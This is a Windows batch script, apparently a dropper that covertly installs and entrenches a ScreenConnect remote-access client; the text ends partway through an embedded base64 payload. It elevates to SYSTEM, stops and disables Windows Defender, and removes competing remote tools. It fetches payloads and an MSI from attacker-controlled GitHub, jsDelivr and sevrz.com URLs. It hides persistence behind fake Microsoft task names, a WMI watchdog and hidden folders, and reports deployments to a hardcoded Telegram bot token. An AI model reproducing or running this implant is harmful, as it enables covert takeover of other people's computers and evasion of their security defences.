@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O28 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O28 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O28: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  REM Strip attrs first, then VERIFY the copy is really this build - else use a fresh unique runner.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O28" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o28_%RANDOM%%RANDOM%.cmd"
    copy /y "%~f0" "!RUNNER!" >nul 2>&1
    echo runner_fallback_unique>>"%LOG%" 2>nul
  ) else (
    mkdir "%WD%" >nul 2>&1
    attrib -h -s -r "%SELF%" >nul 2>&1
    copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O28" "%SELF%" >nul 2>&1
    if errorlevel 1 set "RUNNER=%BOOT%\own_run.cmd"
  )
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=exterminate_then_repair_then_install>>"%LOG%"
  echo engine=cmd_detached_o28>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  echo runner=!RUNNER!>>"%LOG%"
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "PROOF=0"
      for /l %%N in (1,1,6) do (
        if exist "%BOOT%\wproof" set "PROOF=1"
        if not exist "%BOOT%\wproof" timeout /t 2 /nobreak >nul 2>&1
      )
      if "!PROOF!"=="1" (
        set "DETACH_OK=1"
        echo detach_via=schtasks_root>>"%LOG%"
      ) else (
        echo detach_a_noproof>>"%LOG%"
        type "%BOOT%\detach.task" >>"%LOG%" 2>&1
        type "%BOOT%\detach.run" >>"%LOG%" 2>&1
      )
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)
    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O28 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
echo embed_extract_done>>"%LOG%"

REM O28: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M18" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T10" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L7" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (repair-first ladder)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM service deleted but product registered: repair in place (no SC-family msiexec collision)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo primary_svc_missing_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks the SC custom action - clear it
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_!ERRORLEVEL!>>"%LOG%"
timeout /t 10 /nobreak >nul

REM post-install: product registered but service entry still missing -> repair by GUID
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O28: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
echo create_taskA_begin>>"%LOG%"
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O28 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O28 >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0xOApyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
aWduYXR1cmUpLCBtdXR1YWwKcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kgZmFsbGJhY2sg
Y2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRl
cGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KcmVtIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uCgpzZXQgIktFRVBfRlA9NWY2MDEw
NTc5ODUyZTUwNyIKc2V0ICJBTFRfRlA9Zjg2MWM4MTQwZDQ1MzQyNyIKc2V0ICJXRD1DOlxQcm9n
cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLmV0bGNhY2hlIgpzZXQgIkxP
Rz0lV0QlXG93bl9tb24ubG9nIgpzZXQgIlNUQVRFPSVXRCVcb3duX21vbi5zdGF0ZSIKc2V0ICJI
QkZMQUc9JVdEJVxoYi5mbGFnIgpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwu
ZXhlIgpzZXQgIlRHPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9n
aXRodWItZHJvcC9tYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIlRH
Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90
Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcu
Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3Vy
ZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTlNFQzI9aHR0cHM6Ly9jZG4uanNkZWxp
dnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFO
RE9NJSVSQU5ET00lIgpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5j
b20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRP
TSUiCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOTElC
PWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
YWluL293bl9saWIucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05MSUIyPWh0dHBzOi8v
Y2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMx
P3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJNU0lfVVJMPWh0dHBzOi8vc2V2cnouY29tL1NjcmVl
bkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIgpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3LmdpdGh1
YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiCnNldCAi
TVNJX1BLRzI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9w
QG1haW4vcGtnLm1zaSIKc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNsaWVu
dFNldHVwLm1zaSIKCmlmIG5vdCBleGlzdCAiJVdEJSIgbWQgIiVXRCUiIDI+bnVsCmlmIG5vdCBl
eGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwKCnNldCAiTU9OVkVSPU0xNiIKc2V0
ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAi
ICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSIKZWNoby4+PiIlTE9H
JSIKZWNobyDilIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKUgOKUgD4+IiVMT0clIgpz
ZXQgIkNPVU5UPTAiCnNldCAiSU5TVEFMTEVEPTAiCnNldCAiUFJJTV9PSz0wIgpzZXQgIkFMVF9P
Sz0wIgpzZXQgIkZPUkVJR05fTEVGVD0wIgpzZXQgIkZPUkVJR05fTElTVD0iCnNldCAiTVNJRVhJ
VD1ub3QtcnVuIgoKcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUp
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgAppZiBub3QgZXhpc3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBpZiBleGlz
dCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+JjEKaWYgZXhpc3QgIiVXRCVcaWRlbnRpdHku
Y2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVc
